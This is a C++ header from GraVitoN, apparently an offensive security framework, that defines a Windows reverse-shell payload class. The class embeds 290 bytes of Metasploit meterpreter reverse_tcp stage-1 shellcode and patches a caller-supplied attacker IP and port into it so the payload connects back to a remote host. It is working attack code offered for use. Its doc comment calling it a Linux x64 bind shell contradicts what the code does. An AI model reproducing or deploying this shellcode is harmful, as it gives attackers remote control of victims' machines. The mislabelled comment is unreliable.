/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief GraVitoN::Windows_MSF_Shell_Reverse_32
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_Windows_MSF_Shell_Reverse_32_HEAD_
#define _GVN_Windows_MSF_Shell_Reverse_32_HEAD_

#include <payload/payload.hpp>

#include <cstdio>
#include <cstdlib>


namespace GraVitoN
{

namespace Payload
{

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief A Sample Payload
 *
 * This payload is a bind shell for linux x64.
 */
class Windows_MSF_Shell_Reverse_32 : public Payload::Binary_Payload
{
private:
    unsigned int port;
    string host;

protected:
	virtual bool initPayload();
	
public:
	/// Constructor
    Windows_MSF_Shell_Reverse_32 ();

	/// Destructor
    virtual ~Windows_MSF_Shell_Reverse_32 ();

	/**
	 * @brief Initialize
	 *
	 * @param [in] _options
	 * Listening Port ( "Port=7357" )
	 *
	 */
    virtual bool initialize ( const string &remote_ip, const unsigned int &remote_port );
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Windows_MSF_Shell_Reverse_32 ::Windows_MSF_Shell_Reverse_32 ()
{
   jumper = _null_;
   Core::Logger::logItLn ( "Sample -> done" );
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Windows_MSF_Shell_Reverse_32 ::~Windows_MSF_Shell_Reverse_32 ()
{
}

bool Windows_MSF_Shell_Reverse_32 ::initPayload()
{	
    /*
     * windows/meterpreter/reverse_tcp - 290 bytes (stage 1)
     * http://www.metasploit.com
     * VERBOSE=false, LHOST=192.168.56.1, LPORT=4444,
     * ReverseConnectRetries=5, ReverseAllowProxy=false,
     * EnableStageEncoding=false, PrependMigrate=false,
     * EXITFUNC=thread, AutoLoadStdapi=true, InitialAutoRunScript=,
     * AutoRunScript=, AutoSystemInfo=true,
     * EnableUnicodeEncoding=true
     */
    unsigned char buf[] =
    "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
    "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
    "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
    "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
    "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
    "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
    "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
    "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
    "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
    "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
    "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
    "\x05\x68\xc0\xa8\x38\x01\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10"
    "\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
    "\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
    "\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
    "\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
    "\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
    "\x85\xf6\x75\xec\xc3";

    int buf_len = 290;
	
	/// Change port number and port
	unsigned char up = port / 256, down = port % 256;
	unsigned int ip[4];
	buf[204] = up;
	buf[205] = down;
	sscanf(host.c_str(), "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]);
	for(int i=0; i<4; ++i)
		buf[197+i] = (unsigned char)ip[i];

	/*
	for(int i=0; i<buf_len; ++i)
		printf("%.2x", buf[i]);
    */
	payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;

}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Windows_MSF_Shell_Reverse_32 ::initialize(const string &remote_ip, const unsigned int &remote_port)
{
    port = remote_port;
    host = remote_ip;

    Core::Logger::logIt ( "init payload... " );
    initPayload();
    Core::Logger::logItLn ( "done" );

    return true;
}

}
}
#endif // _GVN_Windows_MSF_Shell_Reverse_32_HEAD_
